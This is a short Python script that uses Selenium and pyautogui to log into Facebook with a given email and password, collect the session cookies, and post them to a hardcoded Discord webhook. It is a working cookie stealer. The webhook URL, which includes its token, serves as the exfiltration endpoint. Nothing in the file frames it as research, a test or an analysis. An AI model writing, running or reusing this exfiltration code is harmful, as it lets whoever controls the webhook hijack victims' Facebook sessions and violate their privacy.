import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import pyautogui
import os


def handle_cookies(cookies):
    discord_webhook_url='https://discord.com/api/webhooks/1258800761178030183/maIbngcPGW6Maj1vWx7H2E9zf3VTlmm_eYZ1rAw8FU2nIYe8jdz8JOCWr__EsKtZ1XbO'


    # Send cookies to Discord if webhook URL is provided
    if discord_webhook_url:
        cookies_message = "```\n"
        for cookie in cookies:
            cookies_message += f"{cookie['name']}={cookie['value']}\n"
        cookies_message += "```"

        requests.post(discord_webhook_url, data={"content": cookies_message})
        

def get_facebook_cookies(driver, email, password):
    # Navigate to Facebook and log in
    driver.get("https://www.facebook.com")

    # Fluent wait
    time.sleep(4)

    username_input = driver.find_element(By.XPATH, '//*[@id="email"]')
    password_input = driver.find_element(By.XPATH, '//*[@id="pass"]')

    username_input.send_keys(email)
    password_input.send_keys(password)
    time.sleep(3)

    # Simulate tabbing to the login button
    pyautogui.press('tab')
    pyautogui.press('tab')

    # Simulate pressing Enter to login
    pyautogui.press('enter')

    # Wait for the login to complete
    time.sleep(5)

    # Get the cookies
    cookies = driver.get_cookies()
    time.sleep(4)
    handle_cookies(cookies)

    return cookies